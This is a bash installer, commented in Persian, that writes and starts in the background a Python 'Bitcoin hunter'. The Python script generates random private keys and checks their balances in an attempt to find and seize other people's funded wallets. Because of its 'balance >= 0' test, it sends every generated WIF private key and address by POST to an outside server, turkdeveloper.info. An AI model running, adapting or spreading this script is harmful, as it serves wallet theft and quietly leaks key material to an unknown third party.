#!/bin/bash

# نصب پیش‌نیازها
apt update && apt install python3-pip -y
pip install ecdsa base58 requests bitcoin

# ساخت فایل hunter.py
cat > hunter.py << 'EOF'
import os
import ecdsa
import hashlib
import base58
import requests
import bitcoin

keep_running = True
address = ""
count = 0

print("Start Bitcoin Hunting")
print("---------------------")

def generate_private_key():
    return os.urandom(32)

def private_key_to_wif(private_key):
    extended_key = b"\x80" + private_key
    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
    return base58.b58encode(extended_key + checksum)

def private_key_to_public_key(private_key):
    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    verifying_key = signing_key.get_verifying_key()
    return bytes.fromhex("04") + verifying_key.to_string()

def save(WIF):
    with open('log.txt', 'a') as f:
        f.write("\n")
        f.write(WIF)

def count_found():
    global count
    count += 1

def send_data_to_server(wif_private_key, public_key, address, balance):
    url = "https://turkdeveloper.info/miner/"  # آدرس سرور خود را جایگزین کنید
    payload = {
        "wif_private_key": wif_private_key,
        "public_key": public_key,
        "address": address,
        "balance": balance
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("داده‌ها با موفقیت به سرور ارسال شد:", response.json())
        else:
            print(f"خطا در ارسال داده‌ها: کد وضعیت {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"خطا در ارسال درخواست به سرور: {str(e)}")

def check_balance():
    global address
    private_key = generate_private_key()
    wif_private_key = private_key_to_wif(private_key).decode()
    public_key = private_key_to_public_key(private_key).hex()
    address = bitcoin.pubkey_to_address(public_key)
    try:
        response = requests.get("https://blockchain.info/balance", params={"active": address})
        response.raise_for_status()
        data = response.json()
        final_balance = float(data[address]["final_balance"])
        
        print("WIF Private Key:", wif_private_key)
        print("Public Key:", public_key)
        print("Address:", address)
        print("Balance:", final_balance)
        print("---------------------")
        print("\nFound Wallet with Balance:", count, "\n")
        
        save(wif_private_key)
        
        if final_balance >= 0:
            count_found()
            send_data_to_server(wif_private_key, public_key, address, final_balance)
            with open('FoundAddress.txt', 'a') as f:
                f.write(f"\nWIF: {wif_private_key}, Address: {address}, Balance: {final_balance}")
            print("Donate to HCMLXOX:bc1qk5tpd68l4gfj6uzkq7u0l998dzvzyjpzhgpvnm")
                
    except Exception as e:
        print("Error: Please Check your Network Connection")
        print(e)

while keep_running:
    check_balance()
EOF

# اجرای اسکریپت در پس‌زمینه
nohup python3 hunter.py > output.log 2>&1 &
